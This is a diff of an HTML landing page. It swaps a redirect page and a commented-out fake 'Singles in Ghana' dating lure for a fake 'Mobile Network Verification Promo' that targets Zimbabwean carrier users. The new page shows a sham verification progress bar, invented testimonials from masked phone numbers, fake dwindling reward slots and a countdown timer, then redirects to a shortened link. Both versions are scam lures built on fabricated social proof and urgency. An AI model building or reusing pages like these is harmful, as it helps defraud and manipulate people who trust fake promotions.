@@ -1,254 +1,268 @@
-
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
+
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Connecting...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Network Verification Promo</title>
 
 <style>
+
 body{
+font-family:Arial,sans-serif;
+background:linear-gradient(135deg,#1a3cff,#ffcc00);
 margin:0;
+padding:0;
+text-align:center;
+animation:bgshift 10s infinite alternate;
+}
+
+@keyframes bgshift{
+0%{background:linear-gradient(135deg,#1a3cff,#ffcc00);}
+100%{background:linear-gradient(135deg,#ffcc00,#1a3cff);}
+}
+
+.header{
 background:#000;
-color:#fff;
-font-family:Arial, sans-serif;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-flex-direction:column;
-overflow:hidden;
-}
-
-/* LOGO STYLE */
-.logo{
-font-size:28px;
+color:#ffcc00;
+padding:18px;
+font-size:22px;
 font-weight:bold;
-margin-bottom:20px;
-background:linear-gradient(90deg,#25f4ee,#fe2c55);
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
 }
 
-/* LOADER BAR */
-.loader{
-width:200px;
-height:4px;
-background:#222;
-border-radius:10px;
+.container{
+background:#fff;
+max-width:420px;
+margin:40px auto;
+padding:30px;
+border-radius:12px;
+box-shadow:0 10px 30px rgba(0,0,0,0.25);
+}
+
+h2{
+margin-top:0;
+color:#222;
+}
+
+button{
+width:100%;
+padding:14px;
+margin-top:12px;
+font-size:16px;
+border:none;
+border-radius:6px;
+cursor:pointer;
+}
+
+.mtn{background:#ffcc00;color:#000;}
+.airtel{background:#e60012;color:#fff;}
+.glo{background:#00a651;color:#fff;}
+
+button:hover{
+opacity:0.9;
+}
+
+.progress{
+width:100%;
+background:#ddd;
+height:12px;
+border-radius:6px;
+margin-top:20px;
 overflow:hidden;
 }
 
 .bar{
-height:100%;
 width:0%;
-background:linear-gradient(90deg,#25f4ee,#fe2c55);
-animation:load 2s linear forwards;
+height:12px;
+background:linear-gradient(90deg,#1a3cff,#ffcc00);
 }
 
-@keyframes load{
-0%{width:0%;}
-100%{width:100%;}
+.notice{
+font-size:13px;
+color:#777;
+margin-top:20px;
 }
 
-/* TEXT */
-.text{
-margin-top:15px;
+.slots{
+color:red;
+font-weight:bold;
+margin:10px 0;
+font-size:15px;
+}
+
+.timer{
+font-weight:bold;
+margin-bottom:15px;
+color:#1a3cff;
+}
+
+.ticker{
+background:#fff;
+color:#000;
+padding:12px;
 font-size:14px;
-color:#aaa;
-animation:fade 1s infinite alternate;
-}
-
-@keyframes fade{
-from{opacity:0.5;}
-to{opacity:1;}
+font-weight:bold;
+border-top:2px solid #1a3cff;
+border-bottom:2px solid #1a3cff;
+position:fixed;
+bottom:0;
+width:100%;
 }
 
 </style>
+
 </head>
 
 <body>
 
-<div class="logo">Connecting...</div>
-
-<div class="loader">
-<div class="bar"></div>
+<div class="header">
+Mobile Network Verification Promo
 </div>
 
-<div class="text">Please wait while we match you...</div>
+<div class="container" id="mainBox">
+
+<div class="timer">
+⏳ Offer expires in <span id="countdown">05:30:00</span>
+</div>
+
+<div class="slots">
+⚡ Only <span id="slots">100</span> reward slots left today
+</div>
+
+<h2>Select Your Mobile Network</h2>
+
+<p>Verify your number to unlock exclusive rewards instantly.</p>
+
+<button class="Econet" onclick="verifyNetwork('Econet')">Econet</button> <button class="Telecel" onclick="verifyNetwork('Telecel')">Telecel</button> <button class="NetOne" onclick="verifyNetwork('NetOne')">NetOne</button>
+
+<p class="notice">
+Verification system scans network eligibility before showing rewards
+</p>
+
+</div>
+
+<div class="ticker" id="testimonialTicker">
++263***4521 just received 10GB bonus
+</div>
 
 <script>
 
-// ⏳ REDIRECT AFTER 2 SECONDS
+function verifyNetwork(network){
+
+const box=document.getElementById("mainBox");
+
+box.innerHTML=`
+<h2>Verifying ${network} Network</h2>
+<p id="stepText">Detecting network...</p>
+
+<div class="progress">
+<div class="bar" id="bar"></div>
+</div>
+`;
+
+let progress=0;
+
+const steps=[
+"Detecting network...",
+"Validating reward eligibility...",
+"Checking remaining slots...",
+"Preparing activation..."
+];
+
+let interval=setInterval(function(){
+
+progress+=5;
+
+document.getElementById("bar").style.width=progress+"%";
+
+if(progress==25){
+document.getElementById("stepText").innerText=steps[1];
+}
+
+if(progress==50){
+document.getElementById("stepText").innerText=steps[2];
+}
+
+if(progress==75){
+document.getElementById("stepText").innerText=steps[3];
+}
+
+if(progress>=100){
+
+clearInterval(interval);
+
+document.getElementById("stepText").innerText="Redirecting...";
+
 setTimeout(function(){
+
 window.location.href="https://ln.run/comy";
-}, 100);
 
-</script>
+},1000)
 
-</body>
-</html>
-<!--
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Meet Singles in Ghana</title>
-
-<style>
-body{
-  margin:0;
-  font-family:Arial, sans-serif;
-  background:#0b0b0b;
-  color:#fff;
-  display:flex;
-  justify-content:center;
 }
 
-.container{
-  max-width:400px;
-  width:100%;
-  padding:20px;
-  text-align:center;
+},200)
+
 }
 
-.badge{
-  background:#e91e63;
-  padding:6px 12px;
-  border-radius:20px;
-  font-size:12px;
-  display:inline-block;
-  margin-bottom:15px;
-}
-
-h1{
-  font-size:26px;
-  margin-bottom:10px;
-}
-
-.sub{
-  color:#bbb;
-  font-size:14px;
-  margin-bottom:20px;
-}
-
-.live{
-  background:#111;
-  padding:12px;
-  border-radius:10px;
-  margin-bottom:20px;
-}
-
-.count{
-  font-size:28px;
-  font-weight:bold;
-  color:#ff4d6d;
-}
-
-.profiles{
-  display:flex;
-  justify-content:center;
-  gap:15px;
-  margin-bottom:20px;
-}
-
-.profiles img{
-  width:90px;
-  height:90px;
-  border-radius:50%;
-  object-fit:cover;
-}
-
-.question{
-  font-size:18px;
-  margin-bottom:10px;
-}
-
-.btn{
-  width:100%;
-  padding:14px;
-  margin:6px 0;
-  border:none;
-  border-radius:10px;
-  font-size:16px;
-  font-weight:bold;
-  cursor:pointer;
-}
-
-.male{ background:#333; color:#fff; }
-.female{ background:#e91e63; color:#fff; }
-
-.cta{
-  position:fixed;
-  bottom:15px;
-  left:50%;
-  transform:translateX(-50%);
-  width:90%;
-  max-width:380px;
-}
-
-.cta button{
-  width:100%;
-  padding:16px;
-  background:#ff0055;
-  color:#fff;
-  border:none;
-  border-radius:12px;
-  font-size:18px;
-  font-weight:bold;
-}
-</style>
-</head>
-
-<body>
-
-<div class="container">
-
-<div class="badge">🔥 Singles in Ghana</div>
-
-<h1>Private Dating Community</h1>
-<div class="sub">Real people near you are online now</div>
-
-<div class="live">
-  <div>Online now</div>
-  <div class="count" id="count">1,204</div>
-</div>
-
-<div class="profiles">
-  <img src="https://randomuser.me/api/portraits/women/44.jpg">
-  <img src="https://randomuser.me/api/portraits/women/65.jpg">
-</div>
-
-<div class="question">Who are you looking for?</div>
-
-<button class="btn male">I am a man</button>
-<button class="btn female">I am a woman</button>
-
-</div>
-
-<div class="cta">
-<a href="https://ln.run/comy">
-<button>Start Chatting 🔥</button>
-</a>
-</div>
-
-<script>
-let count = 1204;
-let dir = 1;
+const testimonies=[
+"+263***4521 just received 10GB and 20$ airtime bonus",
+"+263***9932 just received 10GB and 10$ airtime bonus",
+"+263***7710 just received 10GB and 30$ airtime bonus",
+"+263***6284 just received 10GB and 5$ airtime bonus",
+"+263***3345 just received 10GB and 10$ airtime bonus",
+"+263***9921 just received 10GB and 30$ airtime bonus"
+]
 
 setInterval(()=>{
-  if(Math.random()<0.3) dir*=-1;
 
-  count += Math.floor(Math.random()*3)+1 * dir;
+const random=Math.floor(Math.random()*testimonies.length)
 
-  if(count > 1500) dir = -1;
-  if(count < 900) dir = 1;
+document.getElementById("testimonialTicker").innerText=testimonies[random]
 
-  document.getElementById("count").innerText = count;
-},1000);
+},4000)
+
+let slots=23
+
+setInterval(()=>{
+
+if(slots>7){
+
+slots--
+
+document.getElementById("slots").innerText=slots
+
+}
+
+},15000)
+
+let time=19800
+
+const timer=setInterval(()=>{
+
+let h=Math.floor(time/3600)
+
+let m=Math.floor((time%3600)/60)
+
+let s=time%60
+
+document.getElementById("countdown").innerText=
+String(h).padStart(2,'0')+":"+
+String(m).padStart(2,'0')+":"+
+String(s).padStart(2,'0')
+
+time--
+
+if(time<=0){
+clearInterval(timer)
+}
+
+},1000)
+
 </script>
 
 </body>
 </html>
--->
+
